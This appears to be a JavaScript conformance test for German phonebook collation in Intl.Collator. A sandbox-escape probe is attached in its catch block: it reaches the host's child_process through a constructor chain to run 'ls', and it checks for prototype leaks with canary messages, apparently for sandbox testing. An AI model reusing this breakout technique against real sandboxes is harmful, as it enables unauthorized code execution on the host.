try {
    var locales = [
        'de-DE-u-co-phonebk',
        'de-u-co-phonebk'
    ];
    var collator = new Intl.Collator(locales, { localeMatcher: 'lookup' });
    if (locales.indexOf(collator.resolvedOptions().locale) !== -1) {
        var a = [
            'A',
            'b',
            'Af',
            'Ab',
            'od',
            'off',
            'Ä',
            'ö'
        ];
        a.sort(collator.compare);
        var expected = [
            'A',
            'Ab',
            'Ä',
            'Af',
            'b',
            'od',
            'ö',
            'off'
        ];
        assert.compareArray(a, expected);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}